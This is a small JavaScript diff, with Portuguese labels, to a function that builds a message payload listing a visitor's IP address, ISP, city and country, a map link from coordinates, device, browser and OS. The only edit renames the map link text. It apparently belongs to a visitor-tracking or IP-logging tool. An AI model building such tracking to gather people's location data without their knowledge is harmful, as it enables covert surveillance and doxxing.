@@ -101,7 +101,7 @@ function buildPayload(info, visits) {
           { name: "🌐 IP", value: info.ip, inline: false },
           { name: "🏢 Provedor", value: info.isp, inline: false },
           { name: "📍 Localização", value: `${info.city}, ${info.region} - ${info.country}`, inline: false },
-          { name: "🗺️ Mapa", value: `[Ver no Google Maps](${buildGoogleMapsLink(info.latitude, info.longitude)})`, inline: false },
+          { name: "🗺️ Mapa", value: `[Ver no Mapa](${buildGoogleMapsLink(info.latitude, info.longitude)})`, inline: false },
           { name: "📱 Tipo de Dispositivo", value: info.deviceType, inline: false },
           { name: "🧠 Navegador", value: info.browser, inline: true },
           { name: "💻 Sistema Operacional", value: info.os, inline: true },
